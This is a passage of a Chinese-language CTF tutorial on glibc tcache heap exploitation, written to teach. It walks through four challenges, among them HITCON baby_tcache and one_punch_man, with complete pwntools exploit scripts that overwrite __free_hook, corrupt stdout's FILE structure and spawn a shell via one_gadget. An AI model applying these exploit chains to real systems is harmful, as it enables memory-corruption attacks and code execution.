但是在這個過程中需要注意 tcache 的影響。

##### 利用步驟

###### 重排堆塊結構，釋放出 unsorted bin chunk

由於本題只有 10 個可分配塊數量，而整個過程中我們需要用到 3 個 unsorted bin 的 chunk ，加上 7 個 tcache 的 chunk ，所以需要進行一下重排，將一個 tcache 的 chunk 放到 3 個 unsorted bin chunk 和 top chunk 之間，否則會觸發 top 的合併。

```python
    # step 1: get three unsortedbin chunks
    # note that to avoid top consolidation, we need to arrange them like:
    # tcache * 6 -> unsortd  * 3 -> tcache
    for i in range(7):
        new(0x10, str(i) + ' - tcache')

    for i in range(3):
        new(0x10, str(i + 7) + ' - unsorted') # three unsorted bin chunks

    # arrange:
    for i in range(6):
        delete(i)
    delete(9)
    for i in range(6, 9):
        delete(i)
```

重分配後的堆結構：

```
+-----+
|     | <-- tcache perthread 結構體
+-----+
| ... | <-- 6 個 tcache 塊
+-----+
|  A  | <-- 3 個 unsorted bin 塊
+-----+
|  B  |
+-----+
|  C  |
+-----+
|     | <-- tcache 塊，防止 top 合併
+-----+
| top |
|  .. |
```

###### 按照解析中的步驟進行 NULL 字節溢出觸發

爲了觸發 NULL 字節溢出，我們需要使得解析中的 B 塊可以溢出到 C 塊中。由於題目中沒有 edit 功能，所以我們需要讓 B 塊進入 tcache 中，這樣就可以在釋放後再分配出來，且由於 tcache 沒有太多變化和檢查，會較爲穩定。

```python
    for i in range(7):
        new(0x10, str(i) + ' - tcache')

    # rearrange to take second unsorted bin into tcache chunk, but leave first 
    # unsorted bin unchanged
    new(0x10, '7 - first')
    new(0x10, '8 - second')
    new(0x10, '9 - third')

    for i in range(6):
        delete(i)
    # move second into tcache
    delete(8)
```

之後進行 A 塊的釋放（用來提供有效的可以進行 unlink 的 fd 和 bk 值）

```python
    # delete first to provide valid fd & bk
    delete(7)

```

現在堆塊結構如下：

```
+-----+
|     | <-- tcache perthread 結構體
+-----+
| ... | <-- 6 個 tcache 塊 (free)
+-----+
|  A  | <-- free
+-----+
|  B  | <-- free 且爲 tcache 塊
+-----+
|  C  |
+-----+
|     | <-- tcache 塊，防止 top 合併
+-----+
| top |
|  .. |
```

tcache bin 鏈表中，第一位的是 B 塊，所以現在可以將 B 塊進行分配，且進行 NULL 字符溢出。

```python
    new(0xf8, '0 - overflow')
```

在之後的步驟中，我們需要 A 處於 unsorted bin 釋放狀態，B 處於分配狀態，C 處於分配狀態，且最後可以在 tcache 塊 7 個全滿的情況下進行釋放（觸發合併），所以我們需要 7 個 tcache 都被 free 掉。

此時由於 B 塊被分配爲 tcache 塊了，所以需要將防止 top 合併的 tcache 塊釋放掉。

```python
    # fill up tcache
    delete(6)
```

之後就可以將 C 塊釋放，進行合併。

```python
    # trigger
    delete(9)

```

合併後的結構：

```
+-----+
|     | <-- tcache perthread 結構體
+-----+
| ... | <-- 6 個 tcache 塊 (free)
+-----+                     --------+
|  A  | <-- free 大塊               |
+-----+                             |
|  B  | <-- 已分配          --------+--> 一個大 free 塊
+-----+                             |
|  C  | <-- free                    |
+-----+                     --------+
|     | <-- tcache 塊，防止 top 合併 (free)
+-----+
| top |
|  .. |
```


###### 地址泄露

此時的堆已經出現交叉了，接下來將 A 大小從 unsorted bin 中分配出來，就可以使得 libc 地址落入 B 中：

```python
    # step 3: leak, fill up 
    for i in range(7):
        new(0x10, str(i) + ' - tcache')
    new(0x10, '8 - fillup')

    libc_leak = u64(show(0).strip().ljust(8, '\x00'))
    p.info('libc leak {}'.format(hex(libc_leak)))
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc.address = libc_leak - 0x3ebca0
```

堆結構：

```
+-----+
|     | <-- tcache perthread 結構體
+-----+
| ... | <-- 6 個 tcache 塊 (free)
+-----+
|  A  | <-- 已分配
+-----+
|  B  | <-- 已分配          --------+> 一個大 free 塊
+-----+                             |
|  C  | <-- free                    |
+-----+                     --------+
|     | <-- tcache 塊，防止 top 合併 (free)
+-----+
| top |
|  .. |
```

###### tcache UAF attack

接下來，由於 B 塊已經是 free 狀態，但是又有指針指向，所以我們只需要再次分配，使得有兩個指針指向 B 塊，之後在 tcache 空間足夠時，利用 tcache 進行 double free ，進而通過 UAF 攻擊 free hook 即可。


```python
    # step 4: constrecvuntilct UAF, write into __free_hook
    new(0x10, '9 - next')
    # these two provides sendlineots for tcache
    delete(1)
    delete(2)

    delete(0)
    delete(9)
    new(0x10, p64(libc.symbols['__free_hook'])) # 0
    new(0x10, '/bin/sh\x00into target') # 1
    one_gadget = libc.address + 0x4f322 
    new(0x10, p64(one_gadget))

    # system("/bin/sh\x00")
    delete(1)

    p.interactive()

```

##### 完整 exploit

```python
#! /usr/bin/env python2
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
import sys
import os
import os.path
from pwn import *
context(os='linux', arch='amd64', log_level='debug')

p = process('./easy_heap')

def cmd(idx):
    p.recvuntil('>')
    p.sendline(str(idx))


def new(size, content):
    cmd(1)
    p.recvuntil('>')
    p.sendline(str(size))
    p.recvuntil('> ')
    if len(content) >= size:
        p.send(content)
    else:
        p.sendline(content)


def delete(idx):
    cmd(2)
    p.recvuntil('index \n> ')
    p.sendline(str(idx))


def show(idx):
    cmd(3)
    p.recvuntil('> ')
    p.sendline(str(idx))
    return p.recvline()[:-1]


def main():
    # Your exploit script goes here

    # step 1: get three unsortedbin chunks
    # note that to avoid top consolidation, we need to arrange them like:
    # tcache * 6 -> unsortd  * 3 -> tcache
    for i in range(7):
        new(0x10, str(i) + ' - tcache')

    for i in range(3):
        new(0x10, str(i + 7) + ' - unsorted') # three unsorted bin chunks

    # arrange:
    for i in range(6):
        delete(i)
    delete(9)
    for i in range(6, 9):
        delete(i)

    # step 2: use unsorted bin to overflow, and do unlink, trigger consolidation (overecvlineap)
    for i in range(7):
        new(0x10, str(i) + ' - tcache')

    # rearrange to take second unsorted bin into tcache chunk, but leave first 
    # unsorted bin unchanged
    new(0x10, '7 - first')
    new(0x10, '8 - second')
    new(0x10, '9 - third')

    for i in range(6):
        delete(i)
    # move second into tcache
    delete(8)
    # delete first to provide valid fd & bk
    delete(7)

    new(0xf8, '0 - overflow')
    # fill up tcache
    delete(6)

    # trigger
    delete(9)

    # step 3: leak, fill up 
    for i in range(7):
        new(0x10, str(i) + ' - tcache')
    new(0x10, '8 - fillup')

    libc_leak = u64(show(0).strip().ljust(8, '\x00'))
    p.info('libc leak {}'.format(hex(libc_leak)))
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc.address = libc_leak - 0x3ebca0

    # step 4: constrecvuntilct UAF, write into __free_hook
    new(0x10, '9 - next')
    # these two provides sendlineots for tcache
    delete(1)
    delete(2)

    delete(0)
    delete(9)
    new(0x10, p64(libc.symbols['__free_hook'])) # 0
    new(0x10, '/bin/sh\x00into target') # 1
    one_gadget = libc.address + 0x4f322 
    new(0x10, p64(one_gadget))

    # system("/bin/sh\x00")
    delete(1)

    p.interactive()

if __name__ == '__main__':
    main()
```


#### Challenge 2 : HITCON 2018 PWN baby_tcache

##### 基本信息

遠程環境中的 libc 是 libc-2.27.so 和上面的題目一樣。

```bash
zj@zj-virtual-machine:~/c_study/hitcon2018/pwn1$ checksec ./baby_tcache
[*] '/home/zj/c_study/hitcon2018/pwn1/baby_tcache'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

##### 基本功能

程序的功能很簡單 ，就2個功能 ，一個功能爲 New 申請使用內存不大於 0x2000 的 chunk ，總共可以申請 10 塊 ，通過 bss 段上的一個全局數組 arr 來管理申請的 chunk ，同時 bss 段上的數組 size_arr 來存儲相應 chunk 的申請大小 size 。

程序的另外一個功能就是 delete ，刪除所選的堆塊 ，刪除之前會事先把 chunk 的內容區域按照申請的 size 覆蓋成 0xdadadada 。

程序的漏洞代碼在功能 New 的時候 ，寫完數據後 ，有一個 null-byte 溢出漏洞 ，具體如下 ：

```c
int new()
{
  _QWORD *v0; // rax
  signed int i; // [rsp+Ch] [rbp-14h]
  _BYTE *malloc_p; // [rsp+10h] [rbp-10h]
  unsigned __int64 size; // [rsp+18h] [rbp-8h]

  for ( i = 0; ; ++i )
  {
    if ( i > 9 )
    {
      LODWORD(v0) = puts(":(");
      return (signed int)v0;
    }
    if ( !bss_arr[i] )
      break;
  }
  printf("Size:");
  size = str2llnum();
  if ( size > 0x2000 )
    exit(-2);
  malloc_p = malloc(size);
  if ( !malloc_p )
    exit(-1);
  printf("Data:");
  read_input((__int64)malloc_p, size);
  malloc_p[size] = 0;                           // null byte bof
  bss_arr[i] = malloc_p;
  v0 = size_arr;
  size_arr[i] = size;
  return (signed int)v0;
}
```

##### 利用思路

程序的漏洞很容易發現 ，而且申請的 chunk 大小可控 ，所以一般考慮構造 overlapping chunk 處理 。但是問題在於即使把 main_arena 相關的地址寫到了 chunk 上 ，也沒法調用 show 功能做信息泄露 ，因爲程序就沒提供這個功能 。

於是有兩種思路：

1. 可以考慮 partial overwrite 去改掉 main_arena 相關地址的後幾個字節 ，利用 tcache 機制把 `__free_hook` chunk 寫進 tcache 的鏈表中 ，後面利用 unsortedbin attack 往 `__free_hook` 裏面寫上 unsortedbin addr ，後面把 `__free_hook` 分配出來 ，再利用 partial overwrite 在 `__free_hook` 裏面寫上 one_shoot ，不過這個方法的爆破工作量太大需要 4096 次

2. 通過 IO file 進行泄露。題目中使用到了 `puts` 函數，會最終調用到 `_IO_new_file_overflow`，該函數會最終使用 `_IO_do_write` 進行真正的輸出。在輸出時，如果具有緩衝區，會輸出 `_IO_write_base` 開始的緩衝區內容，直到 `_IO_write_ptr` （也就是將 `_IO_write_base` 一直到 `_IO_write_ptr` 部分的值當做緩衝區，在無緩衝區時，兩個指針指向同一位置，位於該結構體附近，也就是 libc 中），但是在 `setbuf` 後，理論上會不使用緩衝區。然而如果能夠修改 `_IO_2_1_stdout_` 結構體的 flags 部分，使得其認爲 stdout 具有緩衝區，再將 `_IO_write_base` 處的值進行 partial overwrite ，就可以泄露出 libc 地址了。

思路 2 中涉及到的相關代碼：

`puts` 函數最終會調用到該函數，我們需要滿足部分 flag 要求使其能夠進入 `_IO_do_write`：

```c
int
_IO_new_file_overflow (_IO_FILE *f, int ch)
{
  if (f->_flags & _IO_NO_WRITES) 
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL) 
    {
      :
      :
    }
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,  // 需要調用的目標，如果使得 _IO_write_base < _IO_write_ptr，且 _IO_write_base 處
                                                // 存在有價值的地址 （libc 地址）則可進行泄露
                                                // 在正常情況下，_IO_write_base == _IO_write_ptr 且位於 libc 中，所以可進行部分寫
			 f->_IO_write_ptr - f->_IO_write_base);

```

進入後的部分：

```c
static
_IO_size_t
new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  _IO_size_t count;
  if (fp->_flags & _IO_IS_APPENDING)  /* 需要滿足 */
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
     ............
    }
  count = _IO_SYSWRITE (fp, data, to_do); // 這裏真正進行 write

```

可以看到，爲調用到目標函數位置，需要滿足部分 flags 要求，具體需要滿足的 flags ：

```c
_flags = 0xfbad0000  // Magic number
_flags & = ~_IO_NO_WRITES // _flags = 0xfbad0000
_flags | = _IO_CURRENTLY_PUTTING // _flags = 0xfbad0800
_flags | = _IO_IS_APPENDING // _flags = 0xfbad1800
```

##### 操作過程

- 形成 overlapping chunk

```python
    alloc(0x500-0x8)  # 0
    alloc(0x30)   # 1
    alloc(0x40)  # 2
    alloc(0x50)  # 3
    alloc(0x60)  # 4
    alloc(0x500-0x8)  # 5
    alloc(0x70)  # 6  gap to top
    
    delete(4)
    alloc(0x68,'A'*0x60+'\x60\x06')  # set the prev size
    
    delete(2)
    delete(0)
    delete(5)  # backward coeleacsing
```

```
gdb-peda$ x/300xg 0x0000555d56ed6000+0x250
0x555d56ed6250:	0x0000000000000000	0x0000000000000b61  ( free(#5) ==> merge into #0 get 0x660+0x500=0xb60 chunk ) #0
0x555d56ed6260:	0x00007fa8a0a3fca0	0x00007fa8a0a3fca0
0x555d56ed6270:	0x0000000000000000	0x0000000000000000
0x555d56ed6280:	0xdadadadadadadada	0xdadadadadadadada
...............
0x555d56ed6740:	0xdadadadadadadada	0xdadadadadadadada
0x555d56ed6750:	0x0000000000000500	0x0000000000000040   #1
0x555d56ed6760:	0x0000000000000061('a')	0x0000000000000000
0x555d56ed6770:	0x0000000000000000	0x0000000000000000
0x555d56ed6780:	0x0000000000000000	0x0000000000000000
0x555d56ed6790:	0x0000000000000000	0x0000000000000051   #2
0x555d56ed67a0:	0x0000000000000000	0xdadadadadadadada
...............
0x555d56ed67e0:	0x0000000000000000	0x0000000000000061   #3
0x555d56ed67f0:	0x0000000000000061('a')	0x0000000000000000
0x555d56ed6800:	0x0000000000000000	0x0000000000000000
...............
0x555d56ed6830:	0x0000000000000000	0x0000000000000000
0x555d56ed6840:	0x0000000000000000	0x0000000000000071   #4
0x555d56ed6850:	0x4141414141414141	0x4141414141414141
...............
0x555d56ed68b0:	0x0000000000000660	0x0000000000000500   #5
...............
```

- 改寫文件結構體的相關字段

```python
    alloc(0x500-0x9+0x34)
    delete(4)
    alloc(0xa8,'\x60\x07')  # corrupt the fd
    
    alloc(0x40,'a')
   
    alloc(0x3e,p64(0xfbad1800)+p64(0)*3+'\x00')  # overwrite the file-structure !!!
```

```
gdb-peda$ x/20xg stdout
0x7fa8a0a40760 <_IO_2_1_stdout_>:	0x00000000fbad1800(!!!)	0x0000000000000000(!!!)
0x7fa8a0a40770 <_IO_2_1_stdout_+16>:	0x0000000000000000(!!!)	0x0000000000000000(!!!)
0x7fa8a0a40780 <_IO_2_1_stdout_+32>:	0x00007fa8a0a40700(!!!_IO_write_base)	0x00007fa8a0a407e3
0x7fa8a0a40790 <_IO_2_1_stdout_+48>:	0x00007fa8a0a407e3	0x00007fa8a0a407e3
0x7fa8a0a407a0 <_IO_2_1_stdout_+64>:	0x00007fa8a0a407e4	0x0000000000000000
0x7fa8a0a407b0 <_IO_2_1_stdout_+80>:	0x0000000000000000	0x0000000000000000
0x7fa8a0a407c0 <_IO_2_1_stdout_+96>:	0x0000000000000000	0x00007fa8a0a3fa00
0x7fa8a0a407d0 <_IO_2_1_stdout_+112>:	0x0000000000000001	0xffffffffffffffff
0x7fa8a0a407e0 <_IO_2_1_stdout_+128>:	0x000000000a000000	0x00007fa8a0a418c0
0x7fa8a0a407f0 <_IO_2_1_stdout_+144>:	0xffffffffffffffff	0x0000000000000000
gdb-peda$ x/20xg 0x00007fa8a0a40700
0x7fa8a0a40700 <_IO_2_1_stderr_+128>:	0x0000000000000000	0x00007fa8a0a418b0 (leak target)
0x7fa8a0a40710 <_IO_2_1_stderr_+144>:	0xffffffffffffffff	0x0000000000000000
0x7fa8a0a40720 <_IO_2_1_stderr_+160>:	0x00007fa8a0a3f780	0x0000000000000000
```

- 文件結構體更改緣由
  - 通過修改 stdout->_flags 使得程序流能夠流到 _IO_do_write (f , f->_IO_write_base , f->_IO_write_ptr - f->_IO_write_base) 這個函數
  
- 完整 exp

```python
from pwn import *
r = process('./baby_tcache'), env={"LD_PRELOAD":"./libc.so.6"})

libc = ELF("./libc.so.6")

def menu(opt):
    r.sendlineafter("Your choice: ",str(opt))

def alloc(size,data='a'):
    menu(1)
    r.sendlineafter("Size:",str(size))
    r.sendafter("Data:",data)

def delete(idx):
    menu(2)
    r.sendlineafter("Index:",str(idx))

def exp():
    alloc(0x500-0x8)  # 0
    alloc(0x30) # 1
    alloc(0x40) # 2
    alloc(0x50) # 3
    alloc(0x60) # 4
    alloc(0x500 - 0x8) # 5
    alloc(0x70) # 6  gap to avoid top consolidation
    
    delete(4)
    alloc(0x68, 'A'*0x60 + '\x60\x06')  # set the prev size
    
    delete(2)
    delete(0)
    delete(5) # backward coeleacsing
    alloc(0x500 - 0x9 + 0x34)
    delete(4)
    alloc(0xa8, '\x60\x07') # corrupt the fd
    
    alloc(0x40, 'a')
   
    alloc(0x3e, p64(0xfbad1800) + p64(0) * 3 + '\x00') # overwrite the file-structure
    
    print(repr(r.recv(8)))
    print("leak!!!!!!!!!")
    info1 = r.recv(8)
    print(repr(info1))
    libc.address = u64(info1) - 0x3ed8b0
    log.info("libc @ " + hex(libc.address))
    alloc(0xa8, p64(libc.symbols['__free_hook']))
    alloc(0x60, "A")
    alloc(0x60, p64(libc.address + 0x4f322)) # one gadget with $rsp+0x40 = NULL
    delete(0)
    r.interactive()

if __name__=='__main__':
    exp()
```

##### Challenge 2 小結

這個程序的利用過程是一個有用的技巧，這種通過文件結構體的方式來實現內存的讀寫的相關資料可以參考臺灣 Angelboy 的博客。在 hctf2018 steak 中，也存在一個信息泄露的問題，大多數人採用了 copy puts_addr 到 `__free_hook` 指針裏實現信息泄露，但實際上也可以通過修改文件結構體的字段來實現信息泄露。

#### Challenge 3 : 2014 HITCON stkof

##### 基本信息

參見[unlink HITCON stkof 簡介](./unlink.md#2014 HITCON stkof)

##### libc 2.26 tcache 利用方法

本題可以溢出較長字節，因此可以覆蓋 chunk 的 fd 指針，在 libc 2.26 之後的 tcache 機制中，未對 fd 指針指向的 chunk 進行 size 檢查，從而可以將 fd 指針覆蓋任意地址。在 free 該被溢出 chunk 並且兩次 malloc 後可以實現任意地址修改：


```python
from pwn import *
from GdbWrapper import GdbWrapper
from one_gadget import generate_one_gadget
context.log_level = "info"
context.endian = "little"
context.word_size = 64
context.os = "linux"
context.arch = "amd64"
context.terminal = ["deepin-terminal", "-x", "zsh", "-c"]
def Alloc(io, size):
    io.sendline("1")
    io.sendline(str(size))
    io.readline()
    io.readline()
def Edit(io, index, length, buf):
    io.sendline("2")
    io.sendline(str(index))
    io.sendline(str(length))
    io.send(buf)
    io.readline()
def Free(io, index):
    io.sendline("3")
    io.sendline(str(index))
    try:
        tmp = io.readline(timeout = 3)
    except Exception:
        io.interactive()
    print tmp
    if "OK" not in tmp and "FAIL" not in tmp:
        return tmp
def main(binary, poc):
    # test env
    bss_ptrlist = None
    free_index = None
    free_try = 2
    elf = ELF(binary)
    libc_real = elf.libc.path[: elf.libc.path.rfind('/') + 1]
    assert elf.arch == "amd64" and (os.path.exists(libc_real + "libc-2.27.so") or os.path.exists(libc_real + "libc-2.26.so"))
    while bss_ptrlist == None:
        # find bss ptr
        io = process(binary)
        gdbwrapper = GdbWrapper(io.pid)
        # gdb.attach(io)
        Alloc(io, 0x400)
        Edit(io, 1, 0x400, "a" * 0x400)
        Alloc(io, 0x400)
        Edit(io, 2, 0x400, "b" * 0x400)
        Alloc(io, 0x400)
        Edit(io, 3, 0x400, "c" * 0x400)
        Alloc(io, 0x400)
        Edit(io, 4, 0x400, "d" * 0x400)
        Alloc(io, 0x400)
        Edit(io, 5, 0x400, "e" * 0x400)
        heap = gdbwrapper.heap()
        heap = [(k, heap[k]) for k in sorted(heap.keys())]
        ptr_addr = []
        index = 1
        while True:
            for chunk in heap:
                address = chunk[0]
                info = chunk[1]
                ptr_addr_length = len(ptr_addr)
                if (info["mchunk_size"] & 0xfffffffffffffffe) == 0x410:
                    for x in gdbwrapper.search("bytes", str(chr(ord('a') + index - 1)) * 0x400):
                        if int(address, 16) + 0x10 == x["ADDR"]:
                            tmp = gdbwrapper.search("qword", x["ADDR"])
                            for y in tmp:
                                if binary.split("/")[-1] in y["PATH"]:
                                    ptr_addr.append(y["ADDR"])
                                    break
                        if (len(ptr_addr) != ptr_addr_length):
                            break
                if len(ptr_addr) != ptr_addr_length:
                    break
            index += 1
            if (index == 5):
                break
        bss_ptrlist = sorted(ptr_addr)[0]
        io.close()
    while free_index == None:
        io = process(binary)
        Alloc(io, 0x400)
        Alloc(io, 0x400)
        Alloc(io, 0x400)
        Free(io, free_try)
        Edit(io, free_try - 1, 0x400 + 0x18, "a" * 0x400 + p64(0) + p64(1041) + p64(0x12345678))
        try:
            Alloc(io, 0x400)
            Alloc(io, 0x400)
        except Exception:
            free_index = free_try
        free_try += 1
        io.close()
    # arbitrary write
    libc = ELF(binary).libc
    one_gadget_offsets = generate_one_gadget(libc.path)
    for one_gadget_offset in one_gadget_offsets:
        io = process(binary)
        libc = elf.libc
        gdbwrapper = GdbWrapper(io.pid)
        Alloc(io, 0x400)
        Alloc(io, 0x400)
        Alloc(io, 0x400)
        Free(io, free_index)
        Edit(io, free_index - 1, 0x400 + 0x18, "a" * 0x400 + p64(0) + p64(1041) + p64(bss_ptrlist - 0x08))
        Alloc(io, 0x400)
        Alloc(io, 0x400)
        ###leak libc
        Edit(io, 5, 0x18, p64(elf.got["free"]) * 2 + p64(elf.got["malloc"]))
        Edit(io, 0, 0x08, p64(elf.plt["puts"]))
        leaked = u64(Free(io, 2)[:-1].ljust(8, "\x00"))
        libc_base = leaked - libc.symbols["malloc"]
        system_addr = libc_base + libc.symbols["system"]
        one_gadget_addr = libc_base + one_gadget_offset
        Edit(io, 1, 0x08, p64(one_gadget_addr))
        Free(io, 1)
        try:
            io.sendline("id")
            log.info(io.readline(timeout=3))
        except Exception, e:
            io.close()
            continue
        io.interactive()
if __name__ == "__main__":
    binary = "./bins/a679df07a8f3a8d590febad45336d031-stkof"
    main(binary, "")
```

#### Challenge 4 : HITCON 2019 one_punch_man

##### 基本信息

開啓了常見保護，題目環境爲 glibc 2.29 ，使用 seccomp 開啓了沙箱保護，只有白名單上的系統調用可以使用。

```bash
╭─wz@wz-virtual-machine ~/Desktop/CTF/xz_files/hitcon2019_one_punch_man ‹master› 
╰─$ checksec ./one_punch
[*] '/home/wz/Desktop/CTF/xz_files/hitcon2019_one_punch_man/one_punch'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
╭─wz@wz-virtual-machine ~/Desktop/CTF/xz_files/hitcon2019_one_punch_man ‹master*› 
╰─$ seccomp-tools dump ./one_punch
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL

```

##### 基本功能

Add 函數可以分配 `[0x80,0x400]` 大小的堆塊，分配的函數爲 `calloc` ，輸入數據首先存儲到棧上，之後再使用 `strncpy` 拷貝到 `bss` 上的數組裏。

Delete 函數 `free` 堆塊之後未清空，造成 `double free` 和 `UAF`

```c
void __fastcall Delete(__int64 a1, __int64 a2)
{
  unsigned int v2; // [rsp+Ch] [rbp-4h]

  MyPuts("idx: ");
  v2 = read_int();
  if ( v2 > 2 )
    error("invalid", a2);
  free(*((void **)&unk_4040 + 2 * v2));
}
```
後門函數可以調用 `malloc` 分配 `0x217` 大小的堆塊，但是要要滿足 `*(_BYTE *)(qword_4030 + 0x20) > 6` ，我們在 `main` 函數裏可以看到這裏被初始化爲 `heap_base+0x10` ，對於 glibc 2.29，這個位置對應存儲的是 `tcache_perthread_struct` 的 `0x220` 大小的 `tcache_bin` 的數量，正常來說，如果我們想調用後門的功能，要讓這個 `count` 爲 7 ，然而這也就意味着 `0x217` 再分配和釋放都同 `glibc 2.23` 一樣，我們無法通過 `UAF` 改 chunk 的 `fd` 來達到任意地址寫的目的，因此我們要通過別的方式修改這個值。
```c
__int64 __fastcall Magic(__int64 a1, __int64 a2)
{
  void *buf; // [rsp+8h] [rbp-8h]

  if ( *(_BYTE *)(qword_4030 + 0x20) <= 6 )
    error("gg", a2);
  buf = malloc(0x217uLL);
  if ( !buf )
    error("err", a2);
  if ( read(0, buf, 0x217uLL) <= 0 )
    error("io", buf);
  puts("Serious Punch!!!");
  puts(&unk_2128);
  return puts(buf);
}
```
Edit 和 Show 函數分別可以對堆塊內容進行編輯和輸出。

##### 利用思路

由於 glibc 2.29 中新增了對於 `unsorted bin` 鏈表完整性檢查，這使得 `unsorted bin attack` 完全失效，我們的目標是往一個地址中寫入 `large value` ，這種情況下就可以選擇 `tcache stashing unlink attack`。

首先我們可以通過UAF來泄露 `heap` 和 `libc` 地址。具體方式是分配並釋放多個chunk使其進入 `tcache` ，通過 `Show` 函數可以輸出 `tcache bin` 的 `fd` 值來泄露堆地址。釋放某個 `small bin size` 範圍內的chunk七個，在第八次釋放時會先把釋放的堆塊放入 `unsorted bin` 。通過 `Show` 函數可以泄露出 libc 地址。

我們首先通過 `UAF` 將 `__malloc_hook` 鏈入 `tcache` 備用。然後分配並釋放六次 `0x100` 大小的chunk進入 `tcache` 。通過 `unsorted bin` 切割得到 `last remainer` 的方式得到兩個大小爲 `0x100` 的chunk。再分配一個超過 0x100 的塊使其進入 `small bin` 。按照釋放順序我們稱之爲 bin1 和 bin2 。修改 `bin2->bk` 爲 `(heap_base+0x2f)-0x10` ，調用 `calloc(0xf0)` 觸發 `small bin` 放入 `tcache` 的處理邏輯，由於 `tcache` 中有 6 個塊，因此循環處理只會進行一次，這樣也避免了 fake_chunk 因 bk 處無可寫地址作爲下一個塊進行 unlink 時 `bck->fd=bin` 帶來的內存訪問錯誤。最終改掉 `heap_base+0x30` 的值繞過檢查。

##### 利用步驟

下面在調用 calloc 前下斷點，可以看到此時 `tcache[0x100]` 有 6 個堆塊，small bin 的分配順序爲 `0x000055555555c460->0x55555555cc80->0x000055555555901f` ，在 `calloc(0xf0)` 調用後， `0x000055555555c460` 會被返回給用戶， `0x55555555cc80` 被鏈入tcache，而由於沒有多餘位置，跳出循環， `0x000055555555901f` 不做處理。

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55555555d9d0 (size : 0x1c630) 
       last_remainder: 0x55555555cc80 (size : 0x100) 
            unsortbin: 0x0
(0x030)  smallbin[ 1]: 0x555555559ba0
(0x100)  smallbin[14]: 0x55555555cc80 (doubly linked list corruption 0x55555555cc80 != 0x100 and 0x55555555cc80 is broken)          
(0x100)   tcache_entry[14](6): 0x55555555a3f0 --> 0x55555555a2f0 --> 0x55555555a1f0 --> 0x55555555a0f0 --> 0x555555559ff0 --> 0x555555559ab0
(0x130)   tcache_entry[17](7): 0x555555559980 --> 0x555555559850 --> 0x555555559720 --> 0x5555555595f0 --> 0x5555555594c0 --> 0x555555559390 --> 0x555555559260
(0x220)   tcache_entry[32](1): 0x55555555d7c0 --> 0x7ffff7fb4c30
(0x410)   tcache_entry[63](7): 0x55555555bd50 --> 0x55555555b940 --> 0x55555555b530 --> 0x55555555b120 --> 0x55555555ad10 --> 0x55555555a900 --> 0x55555555a4f0
gdb-peda$ x/4gx 0x55555555cc80
0x55555555cc80: 0x0000000000000000      0x0000000000000101
0x55555555cc90: 0x000055555555c460      0x000055555555901f
gdb-peda$ x/4gx 0x000055555555c460
0x55555555c460: 0x0000000000000000      0x0000000000000101
0x55555555c470: 0x00007ffff7fb4d90      0x000055555555cc80
gdb-peda$ x/4gx 0x00007ffff7fb4d90
0x7ffff7fb4d90 <main_arena+336>:        0x00007ffff7fb4d80      0x00007ffff7fb4d80                                                  
0x7ffff7fb4da0 <main_arena+352>:        0x000055555555cc80      0x000055555555c460
```
calloc 分配完成之後的結果和我們預期一致， `0x000055555555901f` 作爲 `fake_chunk` 其 `fd` 也被改寫爲了 `libc` 地址
```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
